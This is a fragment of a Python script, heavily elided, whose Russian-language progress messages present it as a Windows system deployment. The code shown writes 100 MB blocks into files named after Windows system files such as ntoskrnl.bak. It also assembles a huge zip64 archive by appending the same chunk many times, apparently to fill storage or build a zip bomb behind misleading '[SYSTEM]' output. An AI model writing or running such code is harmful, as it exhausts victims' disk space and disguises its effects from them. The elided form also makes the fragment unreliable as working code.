...
try:
    ...
    def progress_bar(current, total, desc="Progress", bar_length=40):
        percent = current / total
        filled = int(bar_length * percent)
        bar = "█" * filled + "-" * (bar_length - filled)
        sys.stdout.write(f"\r{desc}: |{bar}| {current}/{total} ({percent*100:.1f}%)")
        sys.stdout.flush()
    ...
    for idx, d in enumerate(system_dirs):
        ...
        for f in ["sys.ini", "config.bin", "data.tmp", "cache.dat", "settings.reg"]:
            try:
                ...
                pass
        progress_bar(idx + 1, total_dirs, "Создание системных папок")
    ...
    print("\n[SYSTEM] Развертывание системных файлов...")
    large_files = [
        "Windows\\System32\\ntoskrnl.bak",
    ...
    for idx, path in enumerate(large_files):
        try:
            full = os.path.join(os.getcwd(), path)
            os.makedirs(os.path.dirname(full), exist_ok=True)
            with open(full, "wb") as f:
                f.write(chunk_100mb)
            progress_bar(idx + 1, len(large_files), "Развертывание файлов")
            time.sleep(0.001)
        except:
            progress_bar(idx + 1, len(large_files), "Развертывание файлов")
    ...
    print("[SYSTEM] Создание профилей пользователей...")
    ...
    print("\n[SYSTEM] Подготовка системных данных...")
        ...
        with zf.open("data.bin", "w", force_zip64=True) as z:
            for i in range(iterations):
                with open("temp_chunk.tmp", "rb") as tf:
                    z.write(tf.read())
                if i % 1000 == 0:
                    progress_bar(i, iterations, "Сборка системного образа")
                if i % 5000 == 0:
                    time.sleep(0.001)
